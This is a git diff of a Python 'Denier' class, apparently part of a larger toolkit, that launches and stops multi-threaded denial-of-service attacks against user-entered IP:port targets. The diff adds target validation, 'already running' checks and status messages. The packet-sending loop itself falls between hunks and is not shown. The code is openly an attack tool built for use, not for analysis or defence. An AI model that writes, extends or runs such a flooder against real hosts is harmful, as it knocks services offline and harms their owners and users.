@@ -1,9 +1,4 @@
-# DOS attack with python and socket, threading, time libraries.
-# Author: M-Taghizadeh (http://m-taghizadeh.ir)
-
-import time
 import socket
-import sys
 import threading
 import random
 # from ..data_buffer import DataBuffer
@@ -12,11 +7,8 @@ class Denier:
 	'''
 	UI:
 
-	[ attack status ]     [ target ip entry:port ]     [ start/stop attack button ]
-	[ attack status ]     [ target ip entry:port ]     [ start/stop attack button ]
-	[ attack status ]     [ target ip entry:port ]     [ start/stop attack button ]
-	[ attack status ]     [ target ip entry:port ]     [ start/stop attack button ]
-	[ attack status ]     [ stop all attacks ]   [ start all attacks ]
+	Label         [_IP:Port_] 
+	Status     [ stop/start ]
 
 	The entry is readonly if it's active
 	You can add another target and start it while other attacks are active
@@ -36,7 +28,7 @@ class Denier:
 		self.buffer = buffer
 
 
-	def is_running(self, target: str|None):
+	def is_running(self, target: str|None=None):
 		'''
 		Return if any dos is running, or if the targeted ip is running
 		Used to display attack statuses
@@ -58,17 +50,27 @@ class Denier:
 		'''
 		Starts attack(s) on the given target(s)
 		'''
+		if self.is_running():
+			self.buffer.put("dos", "status", ["DoS Attack is already running"])
+			return
 		for target in targets:
-			if target not in self.targets:
-				self._start(target)
+			if target not in self.targets and len(target) > 0 and len(target.split(":")) == 2:
+				try:
+					self._start(target)
+				except:
+					self.buffer.put("dos", "status", [f"Error while starting DoS attack on {target}"])
+			else:
+				self.buffer.put("dos", "status", [f"Did not start DoS attack on \"{target}\""])
+
+
 				
 
 
 	def _start(self, target: str):
 
-		
-
 		def job(target: str, job_number: int):
+		# Author: M-Taghizadeh (http://m-taghizadeh.ir)
+
 			address = target.split(":")[0]
 			port = int(target.split(":")[1])
 			while not self.targets[target]["stop_event"].is_set():	
@@ -92,16 +94,17 @@ class Denier:
 			t = threading.Thread(target=job, args=(target, i), daemon=True)
 			self.targets[target]["threads"].append(t)
 			t.start()
-		self.buffer.put("dos", "status", [f"Started {number_of_attacks} DOS attack threads on {target}"])
+		self.buffer.put("dos", "status", [f"Started {number_of_attacks} DoS attack threads on {target}"])
 
 	def stop(self, target_ip: str|None=None):
 		'''
 		Stops attack(s) on the given target(s)
 		'''
-		
+		if not self.is_running(target_ip):
+				self.buffer.put("dos", "status", ["DoS Attack is not running"])
+				return
 		if target_ip is None:
 			for target in self.targets.keys():
-				print(target)
 				self._stop(target)
 			self.targets = {}
 		else:
@@ -119,7 +122,7 @@ class Denier:
 		for t in data["threads"]:
 			t.join(timeout=1)
 
-		self.buffer.put("dos", "status", [f"Stopped DOS attack on {target}"])
+		self.buffer.put("dos", "status", [f"Stopped DoS attack on {target}"])
 
 
 if __name__ == "__main__":
